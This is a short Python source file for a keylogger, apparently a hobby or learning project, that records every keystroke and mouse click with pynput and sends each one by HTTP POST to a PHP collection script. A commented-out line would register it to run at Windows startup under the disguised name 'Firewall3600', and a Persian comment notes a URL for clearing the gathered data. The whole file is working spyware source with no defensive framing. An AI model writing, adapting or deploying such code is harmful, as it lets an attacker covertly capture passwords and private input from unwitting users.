from pynput import mouse, keyboard
from requests import post
from _thread import start_new_thread #http://127.0.0.1/keylogger/keylogger.php?clear= برای پاک کردن دیتا
#import Rayanoos
#import sys

#Rayanoos.tools().reg_add_to_startup('Firewall3600', sys.argv[0]) 

def mouse_log(x, y, butten, perssed):
    if perssed == True:
        post(
            ('http://127.0.0.1/keylogger/keylogger.php'), 
            {
                'mouse' : '(%s %s) : %s' %(str(x), str(y), str(butten))
             }
            )
        

def mouse_start(ID):
    with mouse.Listener(on_click = mouse_log ) as lstn:
        lstn.join()

def keyboard_log(key):
    if type(key) == keyboard._win32.KeyCode:
        k = key.char
    else:
        k = ' ' +str(key)+ ' '

    post('http://127.0.0.1/keylogger/keylogger.php', {'key' : k  })
 
    
def keyboard_start(ID):
    with keyboard.Listener(on_press = keyboard_log) as lstn:
        lstn.join()  
       
start_new_thread(keyboard_start, tuple([1]))
start_new_thread(mouse_start, tuple([2]))
while True:
    pass